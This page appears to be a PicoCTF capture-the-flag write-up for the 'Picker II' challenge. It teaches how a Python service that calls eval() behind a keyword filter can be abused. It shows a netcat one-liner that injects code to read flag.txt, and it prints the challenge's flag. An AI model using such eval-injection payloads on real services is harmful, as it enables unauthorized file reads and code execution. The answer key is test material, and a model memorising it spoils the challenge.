---
title: "Intro to Debuggers"
weight: 7
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
---
# PicoCTF: Low Level Binary Intro - Interlude

We’re going to take a break from low level code and consider some Python programs again. We’ll try to draw some parallels between exploiting binary programs and exploiting Python programs.

## Picker II 

> Can you figure out how this program works to get the flag?

This time, we are analyzing python code, not in a low-level language, but just analyzing high level code.

The problem offer to us a python script file and a connection through netcat (to run the code remotely, where the flag is located). The script have the following functions:

```python
def getRandomNumber():
def exit():
def esoteric1():
def win():
def esoteric2():
def filter(user_input):
```

Running this script, we are presenting with an input to be inserted. If we input the text "getRandomNumber", the program return with "4". This means that we can call any function in the code with this input. The function we want to run is called "win()":

```python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```

This function opens a file named "flag.txt", read it, and print on screen. This is what we need, but there's a problem. Before we reach the "win" function, the input pass through a filter method, that returns false if we try to insert "win" into the program input. So we need to find an alternative.

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

Looking through the Filter, we can see that it uses a vulnerable function called "eval":

```python
if( filter(user_input) ):
	eval(user_input + '()')
```

We can use that to our advantage, maybe we can't use the call to "win", but we can call everything useful inside the function "win". Let's inject a code to read the file "flag.txt" into the program:

```python
echo "print(open('flag.txt', 'r').read())" | nc saturn.picoctf.net 69420
```

And success, with that, the flag is revealed.


{{% details title="Answer: Flag Picker II" open=false %}}
```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
```
{{% /details %}}

---

## Picker III 

> Can you figure out how this program works to get the flag?


